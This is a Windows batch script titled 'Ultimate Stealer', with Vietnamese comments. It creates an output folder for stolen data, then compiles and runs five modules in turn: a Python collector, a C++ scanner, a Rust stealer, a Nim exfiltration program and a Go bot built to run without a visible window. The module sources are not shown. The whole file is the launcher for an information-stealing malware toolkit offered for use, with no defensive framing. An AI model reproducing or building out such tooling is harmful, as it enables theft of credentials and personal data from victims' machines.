@echo off
title Ultimate Stealer
color 0a
echo ========================================
echo    ULTIMATE STEALER - ALL MODULES
echo ========================================
echo.

:: Tạo thư mục output
mkdir C:\StealerData 2>nul

:: Chạy Python collector
echo [1/5] Running Python Collector...
python main.py

:: Compile và chạy C++ scanner
echo [2/5] Running C++ Scanner...
if exist scanner.exe (
    scanner.exe
) else (
    echo Compiling C++...
    cl /O2 /MT /EHsc scanner.cpp /Fe:scanner.exe
    scanner.exe
)

:: Compile và chạy Rust stealer
echo [3/5] Running Rust Stealer...
if exist stealer.exe (
    stealer.exe
) else (
    echo Compiling Rust...
    rustc -C opt-level=3 stealer.rs
    stealer.exe
)

:: Compile và chạy Nim exfil
echo [4/5] Running Nim Exfil...
if exist exfil.exe (
    exfil.exe
) else (
    echo Compiling Nim...
    nim c -d:release --opt:size exfil.nim
    exfil.exe
)

:: Chạy Go bot
echo [5/5] Running Go Bot...
if exist bot.exe (
    bot.exe
) else (
    echo Compiling Go...
    go build -ldflags="-H windowsgui -s -w" -o bot.exe bot.go
    bot.exe
)

echo.
echo ========================================
echo    ALL MODULES COMPLETED!
echo ========================================
pause